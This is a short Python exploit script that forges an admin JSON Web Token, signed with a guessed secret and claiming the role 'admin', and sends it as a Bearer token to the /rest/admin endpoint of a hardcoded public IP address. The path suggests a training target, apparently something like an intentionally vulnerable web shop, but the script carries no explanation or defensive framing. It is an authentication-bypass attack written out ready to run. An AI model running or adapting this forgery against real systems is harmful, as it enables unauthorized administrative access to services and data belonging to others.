import requests
import json
import base64
import hmac
import hashlib

class AdminSectionAccess:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def forge_admin_jwt(self):
        header = {"alg": "HS256", "typ": "JWT"}
        payload = {"role": "admin", "username": "adminUser"}

        header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().strip("=")
        payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().strip("=")

        secret_key = "fake-secret"
        signature = hmac.new(secret_key.encode(), f"{header_b64}.{payload_b64}".encode(), hashlib.sha256).digest()
        signature_b64 = base64.urlsafe_b64encode(signature).decode().strip("=")

        return f"{header_b64}.{payload_b64}.{signature_b64}"

    def run_exploit(self):
        print(f"[+] Running Admin Section Access on {self.base_url}")
        jwt_token = self.forge_admin_jwt()
        self.headers["Authorization"] = f"Bearer {jwt_token}"

        response = self.session.get(f"{self.base_url}/rest/admin", headers=self.headers)

        if response.status_code == 200:
            print("[+] Access granted to Admin Section!")
            print(response.json())
        else:
            print(f"[-] Failed to access Admin Section. Status Code: {response.status_code}")


if __name__ == "__main__":
    url = "http://45.76.47.218:3000"
    exploit = AdminSectionAccess(url)
    exploit.run_exploit()
